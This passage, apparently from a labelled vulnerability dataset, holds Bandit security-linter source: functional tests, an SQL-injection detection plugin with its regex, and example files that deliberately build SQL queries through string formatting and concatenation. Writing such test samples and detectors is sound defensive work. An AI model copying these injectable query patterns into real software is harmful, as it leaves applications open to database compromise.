self.check_example('httplib_https.py', expect)\n\n    def test_imports_aliases(self):\n        '''Test the `import X as Y` syntax.'''\n        expect = {\n            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},\n            'CONFIDENCE': {'HIGH': 9}\n        }\n        self.check_example('imports-aliases.py', expect)\n\n    def test_imports_from(self):\n        '''Test the `from X import Y` syntax.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('imports-from.py', expect)\n\n    def test_imports_function(self):\n        '''Test the `__import__` function.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports-function.py', expect)\n\n    def test_telnet_usage(self):\n        '''Test for `import telnetlib` and Telnet.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('telnetlib.py', expect)\n\n    def test_ftp_usage(self):\n        '''Test for `import ftplib` and FTP.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('ftplib.py', expect)\n\n    def test_imports(self):\n        '''Test for dangerous imports.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports.py', expect)\n\n    def test_mktemp(self):\n        '''Test for `tempfile.mktemp`.'''\n        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}\n        self.check_example('mktemp.py', expect)\n\n    def test_nonsense(self):\n        '''Test that a syntactically invalid module is skipped.'''\n        self.run_example('nonsense.py')\n        self.assertEqual(1, len(self.b_mgr.skipped))\n\n    def test_okay(self):\n        '''Test a vulnerability-free file.'''\n        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}\n        self.check_example('okay.py', expect)\n\n    def test_os_chmod(self):\n        '''Test setting file permissions.'''\n        filename = 'os-chmod-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n        else:\n            filename = filename.format('py3')\n        expect = {\n            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},\n            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}\n        }\n        self.check_example(filename, expect)\n\n    def test_os_exec(self):\n        '''Test for `os.exec*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-exec.py', expect)\n\n    def test_os_popen(self):\n        '''Test for `os.popen`.'''\n        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 9}}\n        self.check_example('os-popen.py', expect)\n\n    def test_os_spawn(self):\n        '''Test for `os.spawn*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-spawn.py', expect)\n\n    def test_os_startfile(self):\n        '''Test for `os.startfile`.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('os-startfile.py', expect)\n\n    def test_os_system(self):\n        '''Test for `os.system`.'''\n        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('os_system.py', expect)\n\n    def test_pickle(self):\n        '''Test for the `pickle` module.'''\n        expect = {\n            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},\n            'CONFIDENCE': {'HIGH': 8}\n        }\n        self.check_example('pickle_deserialize.py', expect)\n\n    def test_popen_wrappers(self):\n        '''Test the `popen2` and `commands` modules.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('popen_wrappers.py', expect)\n\n    def test_random_module(self):\n        '''Test for the `random` module.'''\n        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}\n        self.check_example('random_module.py', expect)\n\n    def test_requests_ssl_verify_disabled(self):\n        '''Test for the `requests` library skipping verification.'''\n        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('requests-ssl-verify-disabled.py', expect)\n\n    def test_skip(self):\n        '''Test `#nosec` and `#noqa` comments.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}\n        self.check_example('skip.py', expect)\n\n    def test_ignore_skip(self):\n        '''Test --ignore-nosec flag.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('skip.py', expect, ignore_nosec=True)\n\n    def test_sql_statements(self):\n        '''Test for SQL injection through string building.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 12},\n            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}\n        self.check_example('sql_statements.py', expect)\n\n    def test_ssl_insecure_version(self):\n        '''Test for insecure SSL protocol versions.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},\n            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}\n        }\n        self.check_example('ssl-insecure-version.py', expect)\n\n    def test_subprocess_shell(self):\n        '''Test for `subprocess.Popen` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},\n            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}\n        }\n        self.check_example('subprocess_shell.py', expect)\n\n    def test_urlopen(self):\n        '''Test for dangerous URL opening.'''\n        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}\n        self.check_example('urlopen.py', expect)\n\n    def test_utils_shell(self):\n        '''Test for `utils.execute*` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'LOW': 5},\n            'CONFIDENCE': {'HIGH': 5}\n        }\n        self.check_example('utils-shell.py', expect)\n\n    def test_wildcard_injection(self):\n        '''Test for wildcard injection in shell commands.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},\n            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}\n        }\n        self.check_example('wildcard-injection.py', expect)\n\n    def test_yaml(self):\n        '''Test for `yaml.load`.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('yaml_load.py', expect)\n\n    def test_jinja2_templating(self):\n        '''Test jinja templating for potential XSS bugs.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4},\n            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}\n        }\n        self.check_example('jinja2_templating.py', expect)\n\n    def test_secret_config_option(self):\n        '''Test for `secret=True` in Oslo's config.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},\n            'CONFIDENCE': {'MEDIUM': 3}\n        }\n        self.check_example('secret-config-option.py', expect)\n\n    def test_mako_templating(self):\n        '''Test Mako templates for XSS.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('mako_templating.py', expect)\n\n    def test_xml(self):\n        '''Test xml vulnerabilities.'''\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_celementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}\n        self.check_example('xml_expatbuilder.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}\n        self.check_example('xml_lxml.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_pulldom.py', expect)\n\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('xml_xmlrpc.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_elementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}\n        self.check_example('xml_expatreader.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_minidom.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}\n        self.check_example('xml_sax.py', expect)\n\n    def test_httpoxy(self):\n        '''Test httpoxy vulnerability.'''\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('httpoxy_cgihandler.py', expect)\n        self.check_example('httpoxy_twisted_script.py', expect)\n        self.check_example('httpoxy_twisted_directory.py', expect)\n\n    def test_asserts(self):\n        '''Test catching the use of assert.'''\n        expect = {'SEVERITY': {'LOW': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('assert.py', expect)\n\n    def test_paramiko_injection(self):\n        '''Test paramiko command execution.'''\n        expect = {'SEVERITY': {'MEDIUM': 2},\n                  'CONFIDENCE': {'MEDIUM': 2}}\n        self.check_example('paramiko_injection.py', expect)\n\n    def test_partial_path(self):\n        '''Test process spawning with partial file paths.'''\n        expect = {'SEVERITY': {'LOW': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n\n        self.check_example('partial_path_process.py', expect)\n\n    def test_try_except_continue(self):\n        '''Test try, except, continue detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                    if x.__name__ == 'try_except_continue'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_continue.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_continue.py', expect)\n\n    def test_try_except_pass(self):\n        '''Test try, except pass detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                     if x.__name__ == 'try_except_pass'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_pass.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_pass.py', expect)\n\n    def test_metric_gathering(self):\n        expect = {\n            'nosec': 2, 'loc': 7,\n            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}\n        }\n        self.check_metrics('skip.py', expect)\n        expect = {\n            'nosec': 0, 'loc': 4,\n            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}\n        }\n        self.check_metrics('imports.py', expect)\n\n    def test_weak_cryptographic_key(self):\n        '''Test for weak key sizes.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},\n            'CONFIDENCE': {'HIGH': 14}\n        }\n        self.check_example('weak_cryptographic_key_sizes.py', expect)\n\n    def test_multiline_code(self):\n        '''Test issues in multiline statements return code as expected.'''\n        self.run_example('multiline_statement.py')\n        self.assertEqual(0, len(self.b_mgr.skipped))\n        self.assertEqual(1, len(self.b_mgr.files_list))\n        self.assertTrue(self.b_mgr.files_list[0].endswith(\n                        'multiline_statement.py'))\n\n        issues = self.b_mgr.get_issue_list()\n        self.assertEqual(2, len(issues))\n        self.assertTrue(\n            issues[0].fname.endswith('examples/multiline_statement.py')\n        )\n\n        self.assertEqual(1, issues[0].lineno)\n        self.assertEqual(list(range(1, 3)), issues[0].linerange)\n        self.assertIn('subprocess', issues[0].get_code())\n        self.assertEqual(5, issues[1].lineno)\n        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)\n        self.assertIn('shell=True', issues[1].get_code())\n\n    def test_code_line_numbers(self):\n        self.run_example('binding.py')\n        issues = self.b_mgr.get_issue_list()\n\n        code_lines = issues[0].get_code().splitlines()\n        lineno = issues[0].lineno\n        self.assertEqual(\"%i \" % (lineno - 1), code_lines[0][:2])\n        self.assertEqual(\"%i \" % (lineno), code_lines[1][:2])\n        self.assertEqual(\"%i \" % (lineno + 1), code_lines[2][:2])\n\n    def test_flask_debug_true(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'MEDIUM': 1}\n        }\n        self.check_example('flask_debug.py', expect)\n\n    def test_nosec(self):\n        expect = {\n            'SEVERITY': {},\n            'CONFIDENCE': {}\n        }\n        self.check_example('nosec.py', expect)\n\n    def test_baseline_filter(self):\n        issue_text = ('A Flask app appears to be run with debug=True, which '\n                      'exposes the Werkzeug debugger and allows the execution '\n                      'of arbitrary code.')\n        json = \"\"\"{\n          \"results\": [\n            {\n              \"code\": \"...\",\n              \"filename\": \"%s/examples/flask_debug.py\",\n              \"issue_confidence\": \"MEDIUM\",\n              \"issue_severity\": \"HIGH\",\n              \"issue_text\": \"%s\",\n              \"line_number\": 10,\n              \"line_range\": [\n                10\n              ],\n              \"test_name\": \"flask_debug_true\",\n              \"test_id\": \"B201\"\n            }\n          ]\n        }\n        \"\"\" % (os.getcwd(), issue_text)\n\n        self.b_mgr.populate_baseline(json)\n        self.run_example('flask_debug.py')\n        self.assertEqual(1, len(self.b_mgr.baseline))\n        self.assertEqual({}, self.b_mgr.get_issue_list())\n\n    def test_blacklist_input(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'HIGH': 1}\n        }\n        self.check_example('input.py', expect)\n/n/n/n", "label": 1}, {"id": "6ce60806ca8a44d8a8b37050539e2b2f9a54b847", "code": "bandit/plugins/injection_sql.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nr\"\"\"\n============================\nB608: Test for SQL injection\n============================\n\nAn SQL injection attack consists of insertion or \"injection\" of a SQL query via\nthe input data given to an application. It is a very common attack vector. This\nplugin test looks for strings that resemble SQL statements that are involved in\nsome form of string building operation. For example:\n\n - \"SELECT %s FROM derp;\" % var\n - \"SELECT thing FROM \" + tab\n - \"SELECT \" + val + \" FROM \" + tab + ...\n - \"SELECT {} FROM derp;\".format(var)\n\nUnless care is taken to sanitize and control the input data when building such\nSQL statement strings, an injection attack becomes possible. If strings of this\nnature are discovered, a LOW confidence issue is reported. In order to boost\nresult confidence, this plugin test will also check to see if the discovered\nstring is in use with standard Python DBAPI calls `execute` or `executemany`.\nIf so, a MEDIUM issue is reported. For example:\n\n - cursor.execute(\"SELECT %s FROM derp;\" % var)\n\n\n:Example:\n\n.. code-block:: none\n\n    >> Issue: Possible SQL injection vector through string-based query\n    construction.\n       Severity: Medium   Confidence: Low\n       Location: ./examples/sql_statements_without_sql_alchemy.py:4\n    3 query = \"DELETE FROM foo WHERE id = '%s'\" % identifier\n    4 query = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\n    5\n\n.. seealso::\n\n - https://www.owasp.org/index.php/SQL_Injection\n - https://security.openstack.org/guidelines/dg_parameterize-database-queries.html  # noqa\n\n.. versionadded:: 0.9.0\n\n\"\"\"\n\nimport ast\nimport re\n\nimport bandit\nfrom bandit.core import test_properties as test\nfrom bandit.core import utils\n\nSIMPLE_SQL_RE = re.compile(\n    r'(select\\s.*from\\s|'\n    r'delete\\s+from\\s|'\n    r'insert\\s+into\\s.*values\\s|'\n    r'update\\s.*set\\s)',\n    re.IGNORECASE | re.DOTALL,\n)\n\n\ndef _check_string(data):\n    return SIMPLE_SQL_RE.search(data) is not None\n\n\ndef _evaluate_ast(node):\n    wrapper = None\n    statement = ''\n\n    if isinstance(node.parent, ast.BinOp):\n        out = utils.concat_string(node, node.parent)\n        wrapper = out[0].parent\n        statement = out[1]\n    elif (isinstance(node.parent, ast.Attribute)\n          and node.parent.attr == 'format'):\n        statement = node.s\n        # Hierarchy for \"\".format() is Wrapper -> Call -> Attribute -> Str\n        wrapper = node.parent.parent.parent\n\n    if isinstance(wrapper, ast.Call):  # wrapped in \"execute\" call?\n        names = ['execute', 'executemany']\n        name = utils.get_called_name(wrapper)\n        return (name in names, statement)\n    else:\n        return (False, statement)\n\n\n@test.checks('Str')\n@test.test_id('B608')\ndef hardcoded_sql_expressions(context):\n    val = _evaluate_ast(context.node)\n    if _check_string(val[1]):\n        return bandit.Issue(\n            severity=bandit.MEDIUM,\n            confidence=bandit.MEDIUM if val[0] else bandit.LOW,\n            text=\"Possible SQL injection vector through string-based \"\n                 \"query construction.\"\n        )\n/n/n/nexamples/sql_statements.py/n/nimport sqlalchemy\n\n# bad\nquery = \"SELECT * FROM foo WHERE id = '%s'\" % identifier\nquery = \"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value\nquery = \"DELETE FROM foo WHERE id = '%s'\" % identifier\nquery = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\nquery = \"\"\"WITH cte AS (SELECT x FROM foo)\nSELECT x FROM cte WHERE x = '%s'\"\"\" % identifier\n# bad alternate forms\nquery = \"SELECT * FROM foo WHERE id = '\" + identifier + \"'\"\nquery = \"SELECT * FROM foo WHERE id = '{}'\".format(identifier)\n\n# bad\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier)\n# bad alternate forms\ncur.execute(\"SELECT * FROM foo WHERE id = '\" + identifier + \"'\")\ncur.execute(\"SELECT * FROM foo WHERE id = '{}'\".format(identifier))\n\n# good\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\", value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\", identifier)\n\n# bug: https://bugs.launchpad.net/bandit/+bug/1479625\ndef a():\n    def b():\n        pass\n    return b\n\na()(\"SELECT %s FROM foo\" % val)\n\n# real world false positives\nchoices=[('server_list', _(\"Select from active instances\"))]\nprint(\"delete from the cache as the first argument\")\n/n/n/ntests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport os\n\nimport six\nimport testtools\n\nfrom bandit.core import config as b_config\nfrom bandit.core import constants as C\nfrom bandit.core import manager as b_manager\nfrom bandit.core import metrics\nfrom bandit.core import test_set as b_test_set\n\n\nclass FunctionalTests(testtools.TestCase):\n\n    '''Functional tests for bandit test plugins.\n\n    This set of tests runs bandit against each example file in turn\n    and records the score returned. This is compared to a known good value.\n    When new tests are added to an example the expected result should be\n    adjusted to match.\n    '''\n\n    def setUp(self):\n        super(FunctionalTests, self).setUp()\n        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch\n        # them up here for the testing environment.\n        #\n        path = os.path.join(os.getcwd(), 'bandit', 'plugins')\n        b_conf = b_config.BanditConfig()\n        self.b_mgr = b_manager.BanditManager(b_conf, 'file')\n        self.b_mgr.b_conf._settings['plugins_dir'] = path\n        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)\n\n    def run_example(self, example_script, ignore_nosec=False):\n        '''A helper method to run the specified test\n\n        This method runs the test, which populates the self.b_mgr.scores\n        value. Call this directly if you need to run a test, but do not\n        need to test the resulting scores against specified values.\n        :param example_script: Filename of an example script to test\n        '''\n        path = os.path.join(os.getcwd(), 'examples', example_script)\n        self.b_mgr.ignore_nosec = ignore_nosec\n        self.b_mgr.discover_files([path], True)\n        self.b_mgr.run_tests()\n\n    def check_example(self, example_script, expect, ignore_nosec=False):\n        '''A helper method to test the scores for example scripts.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected counts of issue types\n        '''\n        # reset scores for subsequent calls to check_example\n        self.b_mgr.scores = []\n        self.run_example(example_script, ignore_nosec=ignore_nosec)\n        expected = 0\n        result = 0\n        for test_scores in self.b_mgr.scores:\n            for score_type in test_scores:\n                self.assertIn(score_type, expect)\n                for rating in expect[score_type]:\n                    expected += (\n                        expect[score_type][rating] * C.RANKING_VALUES[rating]\n                    )\n                result += sum(test_scores[score_type])\n        self.assertEqual(expected, result)\n\n    def check_metrics(self, example_script, expect):\n        '''A helper method to test the metrics being returned.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected values of metrics\n        '''\n        self.b_mgr.metrics = metrics.Metrics()\n        self.b_mgr.scores = []\n        self.run_example(example_script)\n\n        # test general metrics (excludes issue counts)\n        m = self.b_mgr.metrics.data\n        for k in expect:\n            if k != 'issues':\n                self.assertEqual(expect[k], m['_totals'][k])\n        # test issue counts\n        if 'issues' in expect:\n            for (criteria, default) in C.CRITERIA:\n                for rank in C.RANKING:\n                    label = '{0}.{1}'.format(criteria, rank)\n                    expected = 0\n                    if expect['issues'].get(criteria, None).get(rank, None):\n                        expected = expect['issues'][criteria][rank]\n                    self.assertEqual(expected, m['_totals'][label])\n\n    def test_binding(self):\n        '''Test the bind-to-0.0.0.0 example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}\n        self.check_example('binding.py', expect)\n\n    def test_crypto_md5(self):\n        '''Test the `hashlib.md5` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n        self.check_example('crypto-md5.py', expect)\n\n    def test_ciphers(self):\n        '''Test the `Crypto.Cipher` example.'''\n        expect = {'SEVERITY': {'HIGH': 13},\n                  'CONFIDENCE': {'HIGH': 13}}\n        self.check_example('ciphers.py', expect)\n\n    def test_cipher_modes(self):\n        '''Test for insecure cipher modes.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('cipher-modes.py', expect)\n\n    def test_eval(self):\n        '''Test the `eval` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('eval.py', expect)\n\n    def test_mark_safe(self):\n        '''Test the `mark_safe` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('mark_safe.py', expect)\n\n    def test_exec(self):\n        '''Test the `exec` example.'''\n        filename = 'exec-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        else:\n            filename = filename.format('py3')\n            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example(filename, expect)\n\n    def test_exec_as_root(self):\n        '''Test for the `run_as_root=True` keyword argument.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}\n        self.check_example('exec-as-root.py', expect)\n\n    def test_hardcoded_passwords(self):\n        '''Test for hard-coded passwords.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}\n        self.check_example('hardcoded-passwords.py', expect)\n\n    def test_hardcoded_tmp(self):\n        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('hardcoded-tmp.py', expect)\n\n    def test_httplib_https(self):\n        '''Test for `httplib.HTTPSConnection`.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('httplib_https.py', expect)\n\n    def test_imports_aliases(self):\n        '''Test the `import X as Y` syntax.'''\n        expect = {\n            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},\n            'CONFIDENCE': {'HIGH': 9}\n        }\n        self.check_example('imports-aliases.py', expect)\n\n    def test_imports_from(self):\n        '''Test the `from X import Y` syntax.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('imports-from.py', expect)\n\n    def test_imports_function(self):\n        '''Test the `__import__` function.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports-function.py', expect)\n\n    def test_telnet_usage(self):\n        '''Test for `import telnetlib` and Telnet.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('telnetlib.py', expect)\n\n    def test_ftp_usage(self):\n        '''Test for `import ftplib` and FTP.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('ftplib.py', expect)\n\n    def test_imports(self):\n        '''Test for dangerous imports.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports.py', expect)\n\n    def test_mktemp(self):\n        '''Test for `tempfile.mktemp`.'''\n        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}\n        self.check_example('mktemp.py', expect)\n\n    def test_nonsense(self):\n        '''Test that a syntactically invalid module is skipped.'''\n        self.run_example('nonsense.py')\n        self.assertEqual(1, len(self.b_mgr.skipped))\n\n    def test_okay(self):\n        '''Test a vulnerability-free file.'''\n        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}\n        self.check_example('okay.py', expect)\n\n    def test_os_chmod(self):\n        '''Test setting file permissions.'''\n        filename = 'os-chmod-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n        else:\n            filename = filename.format('py3')\n        expect = {\n            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},\n            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}\n        }\n        self.check_example(filename, expect)\n\n    def test_os_exec(self):\n        '''Test for `os.exec*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-exec.py', expect)\n\n    def test_os_popen(self):\n        '''Test for `os.popen`.'''\n        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 9}}\n        self.check_example('os-popen.py', expect)\n\n    def test_os_spawn(self):\n        '''Test for `os.spawn*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-spawn.py', expect)\n\n    def test_os_startfile(self):\n        '''Test for `os.startfile`.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('os-startfile.py', expect)\n\n    def test_os_system(self):\n        '''Test for `os.system`.'''\n        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('os_system.py', expect)\n\n    def test_pickle(self):\n        '''Test for the `pickle` module.'''\n        expect = {\n            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},\n            'CONFIDENCE': {'HIGH': 8}\n        }\n        self.check_example('pickle_deserialize.py', expect)\n\n    def test_popen_wrappers(self):\n        '''Test the `popen2` and `commands` modules.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('popen_wrappers.py', expect)\n\n    def test_random_module(self):\n        '''Test for the `random` module.'''\n        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}\n        self.check_example('random_module.py', expect)\n\n    def test_requests_ssl_verify_disabled(self):\n        '''Test for the `requests` library skipping verification.'''\n        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('requests-ssl-verify-disabled.py', expect)\n\n    def test_skip(self):\n        '''Test `#nosec` and `#noqa` comments.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}\n        self.check_example('skip.py', expect)\n\n    def test_ignore_skip(self):\n        '''Test --ignore-nosec flag.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('skip.py', expect, ignore_nosec=True)\n\n    def test_sql_statements(self):\n        '''Test for SQL injection through string building.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 14},\n            'CONFIDENCE': {'LOW': 8, 'MEDIUM': 